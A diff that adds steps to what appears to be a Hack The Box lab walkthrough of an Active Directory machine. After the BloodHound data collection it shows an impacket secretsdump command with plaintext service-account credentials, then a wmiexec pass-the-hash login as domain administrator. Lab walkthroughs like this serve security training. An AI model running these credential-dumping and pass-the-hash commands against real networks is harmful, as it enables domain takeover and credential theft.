@@ -62,3 +62,12 @@ Above command will generate a zip file, transfer it to your kali machine, if you
 download 20250201165854_BloodHound.zip
 
 run neorj and bloodhound from terminal and upload the zip file.
+
+Dump the NTLM hash with secretdump:
+
+secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+
+Login withh obtained hash:
+
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+
